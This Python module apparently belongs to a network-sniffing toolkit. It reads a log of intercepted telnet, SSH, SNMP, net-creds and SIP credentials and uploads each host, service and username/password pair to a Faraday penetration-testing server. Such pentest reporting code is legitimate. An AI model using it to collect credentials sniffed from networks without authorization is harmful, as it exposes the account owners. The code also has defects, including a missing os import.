import re
import requests
import threading

# Me
__author__ = "Emilio / @ekio_jp"
__version__ = "2.020"


host_data = {
    "ip": "{}",
    "description": "{}",
    "hostnames": []
}

svr_data = {
    "name": "",
    "description": "",
    "owned": False,
    "owner": "",
    "ports": [],
    "protocol": "tcp",
    "parent": "",
    "status": "open",
    "version": "",
    "type": "Service"
}

credential_data = {
    "name": "",
    "username": "",
    "password": "",
    "type": "Cred",
    "parent_type": "Host",
    "parent": ""
}

class Faraday(threading.Thread):
    """
    Class to observe TCP packets
    and decrypt credentials
    """
    def __init__(self, conf):
        threading.Thread.__init__(self)
        self.stoprequest = threading.Event()
        self.file = conf['FILE']
        self.fserver = conf['FSERVER']
        self.ws = conf['FWS']
        self.fuser = conf['FUSER']
        self.fpasswd = conf['FPASSWD']

    def login(self):
        session = requests.Session()
        ap = session.post(self.fserver + '/_api/login', json={'email': self.fuser, 'password': self.fpasswd})
        if ap.status_code == 200:
            return session
        return False

    def run(self):
        sess = self.login()
        if sess:
            print('Faraday API Login: OK')
        else:
            print('Faraday API Login: NG')
        master = []
        while not self.stoprequest.isSet():
            if os.path.isfile(self.file):
                with open(self.file, 'r') as sfile:
                    for line in sfile:
                        if line not in master:
                            telnet = re.findall(':(t,.*)', line)
                            ssh = re.findall(':(s,.*)', line)
                            snmp = re.findall(':p,(.*)', line)
                            netcreds = re.findall(':n,(.*)', line)
                            voip = re.findall(':v,(.*)', line)
                            if telnet:
                                if telnet[0].startswith('t,e,'):
                                    cuser = 'enable'
                                else:
                                    cuser = telnet[0].split(',')[1]
                                cname = 'telnet'
                                cpass = telnet[0].split(',')[2]
                                ip = telnet[0].split(',')[3]
                            elif ssh:
                                if ssh[0].startswith('s,e,'):
                                    cuser = 'enable'
                                else:
                                    cuser = ssh[0].split(',')[1]
                                cname = 'ssh'
                                cpass = ssh[0].split(',')[2]
                                ip = ssh[0].split(',')[3]
                            elif snmp:
                                cname = 'snmp'
                                cuser = 'community'
                                cpass = snmp[0].split(',')[0]
                                ip = snmp[0].split(',')[1]
                            elif netcreds:
                                cname = 'net-creds'
                                cuser = netcreds[0].split(',')[0]
                                cpass = netcreds[0].split(',')[1]
                                ip = netcreds[0].split(',')[len(netcreds[0].split(','))-1]
                            elif voip:
                                cname = 'VoIP'
                                cuser = 'SIP Hash'
                                cpass = voip[0]
                                ip = re.findall('\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', voip[0])[0]

                            if ':' in ip:
                                svr = ip.split(':')[1]
                                ip = ip.split(':')[0]
                            else:
                                svr = ''

                            host_d = host_data.copy()
                            host_d['ip'] = ip
                            resp = sess.post(self.fserver + '/_api/v2/ws/' + self.ws + '/hosts/', json=host_d)
                            data = resp.json()
                            if 'message' in data:
                                parent = data['object']['id']
                            else:
                                parent = data['id']

                            if svr:
                                svr_d = svr_data.copy()
                                svr_d['ports'].append(svr)
                                svr_d['parent'] = parent
                                resp = sess.post(self.fserver + '/_api/v2/ws/' + self.ws + '/services/', json=svr_d)

                            cred_d = credential_data.copy()
                            cred_d['parent'] = parent
                            cred_d['name'] = cname
                            cred_d['username'] = cuser
                            cred_d['password'] = cpass

                            resp = sess.get(self.fserver + '/_api/v2/ws/' + self.ws + '/credential/')
                            if resp.status_code == 200:
                                credata = resp.json()
                                EXIST = False
                                for x in range(len(credata['rows'])):
                                    t = credata['rows'][x]['value']['target']
                                    n = credata['rows'][x]['value']['name']
                                    u = credata['rows'][x]['value']['username']
                                    p = credata['rows'][x]['value']['password']
                                    if t == host_d['ip'] and n == cname and u == cuser and p == cpass:
                                        EXIST = True
                                        break

                                if not EXIST:
                                    resp = sess.post(self.fserver + '/_api/v2/ws/' + self.ws + '/credential/', json=cred_d)
                            master.append(line)

    def join(self):
        self.stoprequest.set()
